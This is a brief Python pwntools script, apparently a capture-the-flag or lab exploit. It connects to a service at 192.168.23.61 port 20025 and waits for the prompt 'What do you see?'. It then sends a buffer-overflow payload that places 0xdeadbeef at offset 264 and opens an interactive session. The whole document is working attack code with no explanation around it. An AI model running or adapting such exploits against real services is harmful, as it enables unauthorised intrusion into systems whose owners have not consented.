from pwn import *
io = remote("192.168.23.61", 20025)

payload=fit({
    264: 0xdeadbeef,
})

io.recvuntil("What do you see?")
io.sendline(payload)
io.interactive()
